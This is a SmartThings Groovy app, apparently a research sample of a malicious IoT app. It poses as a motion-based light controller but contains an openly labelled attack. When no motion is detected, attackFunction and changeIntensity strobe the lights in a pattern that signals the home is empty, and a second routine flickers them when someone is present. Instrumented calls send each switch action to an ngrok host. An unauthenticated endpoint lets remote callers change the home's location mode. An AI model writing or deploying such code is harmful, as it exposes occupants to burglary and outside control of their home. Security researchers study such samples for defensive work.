definition(

    name: "Side channel 1",

    namespace: "csl",

    author: "Amit Sikder",

    updated: "Leo Babun",

    description: "To make your light controlling smart, this light controller could control the light according to your motion detected by motionsensor. If there is no motion detected by the sensor this app strobe the lights (a specific on/off pattern) to indicate that there are nobody in the home. Attack function is implemented from line 343 to 381. The condition of the attack is given in line 271 and 323. ",

    category: "Safety & Security",

    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",

    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",

    iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
       section("Title") {
           input "themotionsensor", "capability.motionSensor", title: "Where?"
         input "minutes", "number", required: true, title: "Minutes?"
         //input "myswitch", "capability.switch", title: "switch?"
         input "myswitch", "capability.switchLevel", title:"switchlevel?", multiple: true
       }
}

def installed() {
       log.debug "Installed with settings: ${settings}"
       initialize()
}


def updated() {
       log.debug "Updated with settings: ${settings}"
       unsubscribe()
       initialize()
}

def initialize() {
       //subscribe(themotionsensor, "motion", myHandler)
    subscribe(themotionsensor, "motion.active", motionDetectedHandler)
    subscribe(themotionsensor, "motion.inactive", motionStoppedHandler)
}

def myHandler(evt) {
       //state.switchState = myswitch.currentState("level").value
       //def switchState = myswitch.currentState("level")
    try{
          log.debug "attack"
              runIn(60*minutes,changeIntensity,[overwrite: false])
    }

    catch(e) {
          log.debug e
    }
}

def changeIntensity() {
       //def switchState = myswitch.currentState("level")
       //def add = true
    def data = [:]  // instrumented code
    def cnt = 0 // instrumented code
    def value = myswitch.currentState("level").value.first().toInteger()

    if(state.motionDetected==true) {
        cnt++ // instrumented code
        data['action'+cnt] = "sink1: myswitch setLevel(${80})"  // instrumented code
        myswitch.setLevel(80)  // sink 1

        log.debug "stop attack. value:"
    }
    log.debug "value now:$value"
    if(state.motionDetected==false) {
          if(value<=20) {
              state.add=true
              cnt++ // instrumented code
              data['action'+cnt] = "sink2: myswitch setLevel(${value+20})"  // instrumented code
              myswitch.setLevel(value+20)  // sink 2

             log.debug "$value+20"

            }

          if(value>20&&value<80&& state.add) {
              cnt++ // instrumented code
              data['action'+cnt] = "sink3: myswitch setLevel(${value+20})"  // instrumented code
              myswitch.setLevel(value+20)  // sink 3

             log.debug "$value+20"
          }

        if(value>=80) {
            state.add = false;
            cnt++ // instrumented code
            data['action'+cnt] = "sink4: myswitch setLevel(${value-20})"  // instrumented code
            myswitch.setLevel(value-20)  // sink 4

            log.debug "$value-20"

        }

        if(value>20&value<80&&!state.add) {
            cnt++ // instrumented code
            data['action'+cnt] = "sink5: myswitch setLevel(${value+20})"  // instrumented code
            myswitch.setLevel(value-20)  //  sink 5

            log.debug "$value-20"
        }
        runIn(60*0.1,changeIntensity,[overwrite: false])
    }
    sendRequest(data)  // instrumented code
}

////
def changeIntensity1() {
       //def switchState = myswitch.currentState("level")
       //def add = true
    def data = [:]  // instrumented code
    def cnt = 0 // instrumented code
    def value = myswitch.currentState("level").value.first().toInteger()
    log.debug "value now:$value"
    if(value<=20) {
        state.add=true
        cnt++ // instrumented code
        data['action'+cnt] = "sink6: myswitch setLevel(${value+60})"  // instrumented code
        myswitch.setLevel(value+60)  // sink 6

        log.debug "$value+60"

    }

    if(value>20&&value<80&& state.add) {
        cnt++ // instrumented code
        data['action'+cnt] = "sink7: myswitch setLevel(${value+20})"  // instrumented code
        myswitch.setLevel(value+20)  // sink 7

        log.debug "$value+20"
    }

    if(value>=80) {
        state.add = false;
        cnt++ // instrumented code
        data['action'+cnt] = "sink8: myswitch setLevel(${value-20})"  // instrumented code
        myswitch.setLevel(value-60)  // sink 8

        log.debug "$value-60"

    }

    if(value>20&value<80&&!state.add) {
        cnt++ // instrumented code
        data['action'+cnt] = "sink9: myswitch setLevel(${value-20})"  // instrumented code
        myswitch.setLevel(value-20)  //  sink 9

        log.debug "$value-20"

    }

    runIn(0.5,changeIntensity1,[overwrite: false])
    sendRequest(data)  // instrumented code
}

///

def motionDetectedHandler(evt) {
    def data = [:]  // instrumented code
    def cnt = 0 // instrumented code
    state.motionDetected = true
    log.debug "motionDetectedHandler called--home!!!"
    cnt++ // instrumented code
    data['action'+cnt] = "sink10: myswitch setLevel(${80})"  // instrumented code
    myswitch.setLevel(80)  // sink 10

     attackFunction1()

    // log.debug "home:$myswitch.currentState("level").value.first().toInteger()"
    sendRequest(data)  // instrumented code
}

 

def motionStoppedHandler(evt) {
    log.debug "motionStoppedHandler called"
    runIn(60 * minutes, checkMotion)
}

 

def checkMotion() {
    def data = [:]  // instrumented code
    def cnt = 0 // instrumented code
    log.debug "In checkMotion scheduled method"
    def motionState = themotionsensor.currentState("motion")

    if (motionState.value == "inactive") {
        // get the time elapsed between now and when the motion reported inactive
        def elapsed = now() - motionState.date.time

        // elapsed time is in milliseconds, so the threshold must be converted to milliseconds too

        def threshold = 1000 * 60 * (minutes-0.1)

        if (elapsed >= threshold) {
            log.debug " ($elapsed ms):  not home!!!"
            cnt++ // instrumented code
            data['action'+cnt] = "sink11: myswitch setLevel(${0})"  // instrumented code
            myswitch.setLevel(0)  // sink 11

            state.motionDetected = false
            //log.debug "not home:$myswitch.currentState("level").value.first().toInteger()"
            attackFunction()

        } else {
            log.debug "still home"
        }
    } else {
        // Motion active; just log it and do nothing
        log.debug "Home"
    }
    sendRequest(data)  // instrumented code
}

 

def attackFunction() {
       try{
          log.debug "attack"
              runIn(60*0.1,changeIntensity,[overwrite: false])
    }
    catch(e) {
          log.debug e
    }
}

def attackFunction1() {
       try{
          log.debug "attack1"
              runIn(60*0.1,changeIntensity1,[overwrite: false])
    }
    catch(e) {
          log.debug e
    }

}


// the following simulates instrumented end point codes for web services hookup
mappings {
    // this is the end point for simulating user location
    path("/location/:command") {
        //log.info("/location/:command")
        action: [
                GET: "location"
        ]
    }
}

void location() {
    //eventHandler(evt)
    def command = params.command
    log.debug("Receive command: $command")

    // format command
    command = command.replaceFirst(command[0], command[0].toUpperCase()) // home -> Home, away -> Away

    def currMode = location.currentMode // "Home", "Away", etc.
    log.debug "current mode is $currMode"

    location.setMode(command)  // change location
}

def sendRequest(data) {
    // [q:'Minneapolis', mode: 'json']
    def params = [
            uri:  'https://62f870a15b61.ngrok.io/',
            path: 'fuzzthings/things.php',
            contentType: 'application/json',
            query: data
    ]
    try {
        httpGet(params){resp ->
            log.debug "connection okay"
        }
    } catch (e) {
        log.error "error: $e"
    }
}
